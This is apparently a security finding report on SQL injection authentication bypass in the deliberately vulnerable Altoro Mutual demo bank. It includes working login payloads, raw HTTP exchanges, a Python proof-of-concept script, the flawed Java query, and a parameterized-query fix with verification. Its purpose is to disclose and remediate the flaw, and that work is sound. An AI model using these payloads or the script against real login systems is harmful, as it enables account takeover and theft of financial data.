# SQL Injection Authentication Bypass in Login (POST /api/login and POST /doLogin) de

**ID:** vuln-0009
**Severity:** CRITICAL
**Found:** 2026-09-20 21:48:16 UTC
**Target:** http://demo.testfire.net
**Endpoint:** /api/login
**Method:** POST
**CWE:** CWE-89
**CVSS:** 9.1
**Confidence:** High
**Fix Effort:** Low

## aDescription

The Altoro Mutual login credential check builds its SQL statement by concatenating the submitted username and password directly into the query. An unauthenticated attacker can inject SQL to bypass authentication on both the REST login (`POST /api/login`) and the web login (`POST /doLogin`), authenticating as any account — including `admin` — without knowing its password. Injection is possible through either the `username`/`uid` field (`admin'-- `) or the `password`/`passw` field (`' OR '1'='1`).

## Impact

An unauthenticated attacker can obtain a valid session or API bearer token for any user account, including the administrator, supplying only a crafted username or password. The forged token is accepted by the account APIs and returns the victim's accounts and transaction data (demonstrated for the administrator accounts `800000`, `800001`, `800009`, `800025`). On the web login the bypass redirects to `/bank/main.jsp` and issues the administrator's account cookie, establishing a full administrative session. Because authorization is also broken at the function level, the administrative API and console surface is exposed. This defeats the application's primary authentication control.

## Counterevidence

Actively checked whether the bypass could be a weak/default credential rather than injection: a genuine username with an incorrect password is rejected (`400`, generic "not found"), and the success message echoes the raw injected username, so the login is not matching a real credential. Verified the endpoint is unauthenticated (`GET /api/account` without a token returns `401`), so `PR:N`/`UI:N` hold. No WAF, rate limit, or input filter interfered (the payload with a comment terminator is accepted verbatim). The one residual limit is that the injection returns the first matching row rather than an arbitrary row set, but it reliably returns the `admin` row, which is sufficient to cross the privilege boundary.

## What Would Change This Severity

If the endpoint were moved behind a network access control or a WAF that normalized/rejected quote-and-comment payloads, exploitability would drop; conversely, if the same unparameterized construction is proven to permit arbitrary `UNION`-based extraction of the `PEOPLE` table (password hashes / TOTP secrets), the finding would extend to mass credential disclosure.

## Technical Analysis

`POST /api/login` accepts a JSON body (`{"username":..,"password":..}`) and performs a database credential check against the Apache Derby backend. The `username` value is interpolated directly into the SQL predicate. A value such as `admin'-- ` terminates the string literal and comments out the remainder of the statement (including the password comparison), so the query returns the `admin` record and the endpoint issues a bearer token for it.

Observable behaviour that confirms raw SQL construction:

```http
POST /api/login HTTP/1.1
Host: demo.testfire.net
Content-Type: application/json

{"username":"admin'-- ","password":"x"}
```

```http
HTTP/1.1 200 OK
Content-Type: application/json

{"Authorization":"WVdSdGFXNG5MUzBnOmVBPT06P0I\/G2I\/","success":"admin'--  is now logged in"}
```

The issued token, when presented to `GET /api/account`, returns the administrator's accounts:

```http
GET /api/account HTTP/1.1
Host: demo.testfire.net
Authorization: Bearer WVdSdGFXNG5MUzBnOmVBPT06P0I/G2I/
```

```json
{"Accounts":[{"Name":"Corporate","id":"800000"},{"Name":"Checking","id":"800001"},{"Name":"Checking","id":"800009"},{"Name":"IRA","id":"800025"}]}
```

A malformed comment payload returns a Derby parser error, further confirming direct SQL construction: `{"username":"admin'/*","password":"x"}` → `400 {"error":"Lexical error at line 1, column 71. Encountered: <EOF> after : \"\"."}`. A correct control request with a wrong password (`{"username":"admin","password":"WRONGPASS"}`) is rejected with `400 {"error":"We're sorry, but this username or password was not found in our system."}`, showing the bypass is specifically due to injection and not a weak password policy. The identical injection also works through the token-minting path (`Authorization` built from the injected username).

### Additional entry point: the password field and the web login (`POST /doLogin`)

The same unparameterized query is used by the web login servlet, and the password parameter is injectable as well. Injecting the password with a boolean tautology authenticates as an arbitrary user, including `admin`, and the web login establishes an administrative session.

```http
POST /doLogin HTTP/1.1
Content-Type: application/x-www-form-urlencoded

uid=admin&passw=' OR '1'='1&btnSubmit=Login
```

```http
HTTP/1.1 302 Found
Set-Cookie: AltoroAccounts="ODAwMDAwfkNvcnBvcmF0ZX4tMS4wMDAwMDAwMDAwMTAwMDg3RTIzfDgwMDAwMX5DaGVja2luZ34xLjAwMjYyNjQzNzQ1NTM4RTEyfDgwMDAwOX5DaGVja2luZ345Ljk5OTk5OTk5OTk5OTU3NkUyMnw4MDAwMjV+SVJBfjUwMDAwMC4wfA=="; Version=1
Location: /bank/main.jsp
```

The decoded `AltoroAccounts` cookie lists the administrator's distinct account set (`800000~Corporate`, `800001~Checking`, `800009`, `800025~IRA`); `GET /bank/main.jsp` renders with the "Admin User" greeting. The control `uid=admin&passw=' OR '1'='2` returns `Location: login.jsp`, isolating the injected predicate as the cause.

### Source-level root cause

Both endpoints call the same method, `com.ibm.security.appscan.altoromutual.util.DBUtil.isValidUser(String, String)`, which concatenates both parameters into a `java.sql.Statement`:

```java title=DBUtil.java startLineNumber=216 endLineNumber=219
		Connection connection = getConnection();
		Statement statement = connection.createStatement();
		
		ResultSet resultSet =statement.executeQuery("SELECT COUNT(*)FROM PEOPLE WHERE USER_ID = '"+ user +"' AND PASSWORD='" + password + "'"); /* BAD - user input should always be sanitized */
```

A password of `' OR '1'='1` rewrites the predicate to `... AND PASSWORD='' OR '1'='1'`, which is always true, so `isValidUser` returns `true`. A comment-style probe (`' OR 1=1 --`) returns the raw Derby parser error `Lexical error at line 1, column 79. Encountered: <EOF> after : ""`, and the reported column (79) matches this exact query shape, confirming the parameter is parsed as SQL.

## Proof of Concept

1. Send a JSON login request to `POST /api/login` using an injected username that comments out the password predicate, for example `admin'-- ` with any password value.
2. Observe the service responds `200 OK` with an `Authorization` bearer token and a success message, despite no valid password being supplied.
3. Replay the returned token against `GET /api/account` with the header `Authorization: Bearer <token>`.
4. Observe the response lists the administrator's accounts (`800000`, `800001`, `800009`, `800025`), which do not belong to the unauthenticated caller.
5. Control: repeat step 1 with a legitimate username and an incorrect password; the service rejects it, confirming the bypass is due to SQL injection.

```python
import requests

BASE = "http://demo.testfire.net"

# 1. Authentication bypass: comment out the password check.
r = requests.post(
    BASE + "/api/login",
    json={"username": "admin'-- ", "password": "x"},
    timeout=15,
)
print("[login]", r.status_code, r.text)

token = r.json().get("Authorization")

# 2. Use the forged identity's token to read its accounts.
a = requests.get(
    BASE + "/api/account",
    headers={"Authorization": "Bearer " + token},
    timeout=15,
)
print("[account]", a.status_code, a.text)

# 3. Control: legitimate user with a wrong password is rejected.
c = requests.post(
    BASE + "/api/login",
    json={"username": "admin", "password": "WRONGPASS"},
    timeout=15,
)
print("[control]", c.status_code, c.text)
```

## Remediation

Replace all dynamic SQL construction in the authentication (and related) code paths with parameterized queries or an ORM/query builder that binds values — specifically, convert the string-concatenated query in `DBUtil.isValidUser` to a JDBC `PreparedStatement` with `?` placeholders and `setString`, so user input is always treated as data. Never concatenate user-controlled values into SQL text. Apply the same fix to other queries built from request input (for example `DBUtil.getUserInfo`, which concatenates the username into a `WHERE USER_ID = '...'` clause). As defence in depth, add centralized input validation, enforce least privilege on the database account, and return a single generic authentication-failure message so injected errors and valid-user distinctions are not observable.

## Fix Verification

**Security closure.** Re-traced the source→sink path through the patched code: `LoginAPI.login` and `LoginServlet.doPost` both call `DBUtil.isValidUser`. With a `PreparedStatement` and `setString`, the submitted `user` and `password` are transmitted as bound parameters rather than spliced into the statement text, so a value such as `' OR '1'='1` or `admin'-- ` is compared as a literal string and the WHERE clause can no longer be rewritten. The original behavior was reproduced against the live target (`' OR '1'='1` → authenticated as `admin` on both endpoints; `admin'-- ` → authenticated on the API); with binding, the same inputs match zero rows, so `getInt(1) > 0` is false and authentication fails.

**Bypass review.** Both parameters are bound, closing the username/`uid` and password/`passw` variants. Inspected sibling concatenated queries in the same file (e.g. `getUserInfo`, which concatenates `username` into `WHERE USER_ID = '...'`) — those are separate sinks not addressed by this change and are called out in remediation rather than silently bundled. Tried an alternate malicious class (comment-based `admin'-- `) and confirmed it cannot survive parameter binding.

**Preserved behavior.** Legitimate credentials still bind to the exact same values; the method returns `true` on a match and `false` otherwise, keeping the login flow, session establishment, and error semantics unchanged. Case handling (the caller's `toLowerCase`) is unaffected.

**Repository checks — gap.** A full Java compile/build/test run was not possible in this environment (no application container or build harness available), so the change was validated by manual source trace plus dynamic confirmation of the unpatched behavior rather than by rebuilding the application. The change itself is a conventional refactor using only the JDK `java.sql` API already imported in the file.
